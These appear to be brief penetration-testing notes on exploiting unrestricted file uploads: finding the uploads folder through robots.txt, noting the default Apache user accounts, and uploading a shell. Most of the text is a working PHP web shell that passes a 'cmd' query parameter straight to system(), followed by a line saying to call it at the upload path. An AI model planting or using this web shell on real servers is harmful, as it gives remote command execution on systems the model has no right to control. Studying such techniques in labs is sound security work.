### Site allows unsanitized file uploads

#Server doesn’t validate extension or size
#Allows for code execution (shell)
#Once uploaded
#Find your file
#Call your file
#^^^^^^^^^ you need all 3 

#go to the webserver + robots and find the uploads folder 
### The default user for an Apache web server is typically called "www-data" on Debian-based systems like Ubuntu, and "apache" 
### on RedHat-based systems like CentOS, which is a dedicated system user account with limited permissions specifically designed to run the Apache web server process.

"""
<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
"""

### website/(where ever uploads go)/your script 
